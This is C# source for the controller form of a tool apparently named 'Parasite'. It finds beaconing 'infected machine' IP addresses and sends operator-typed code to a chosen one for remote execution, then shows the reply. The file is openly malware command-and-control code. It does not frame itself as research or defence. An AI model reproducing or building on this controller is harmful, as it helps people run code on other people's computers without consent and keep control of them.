using Parasite.Common;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Parasite.Controller
{
    public partial class ControllerForm : Form
    {
        TextBoxWriter tbw;
        BeaconFinder bf;

        public ControllerForm()
        {
            InitializeComponent();
            tbw = new TextBoxWriter(this.textBox1);
            Console.SetOut(tbw);
            bf = new BeaconFinder(9999);
            bf.FoundBeaconEvent += Bf_FoundBeaconEvent;
        }

        private void Bf_FoundBeaconEvent(string ip)
        {
            this.listBox1.Invoke((MethodInvoker)delegate
            {
                this.listBox1.Items.Add(ip);
            });
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if(listBox1.SelectedItem == null)
            {
                MessageBox.Show("Oops! no infected machine selected.");
                return;
            }
            Console.WriteLine("Sending Test Request...");
            var selected = (string)listBox1.SelectedItem;

            var req = new Requester(6969);
            var reqs = new Request()
            {
                Type = RequestType.Code,
                Data = textBox2.Text
            };
            if(Encoding.UTF8.GetByteCount(reqs.ToString()) > 2048)
            {
                MessageBox.Show("Oops! Request too big yo.");
                return;
            }

            var resp = req.DoRequest(selected, reqs);

            Console.WriteLine($"Received response with type {resp.Type.ToString()} and data {resp.Data}");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            button2.Enabled = false;
            bf.Start();
        }
    }

    public class TextBoxWriter : TextWriter
    {
        // The control where we will write text.
        private Control MyControl;
        public TextBoxWriter(Control control)
        {
            MyControl = control;
        }

        public override void Write(char value)
        {
            MyControl.Invoke((MethodInvoker)delegate
            {
                MyControl.Text += value;
            });
        }

        public override void Write(string value)
        {
            MyControl.Invoke((MethodInvoker)delegate
            {
                MyControl.Text += value;
            });
        }

        public override Encoding Encoding
        {
            get { return Encoding.UTF8; }
        }
    }
}
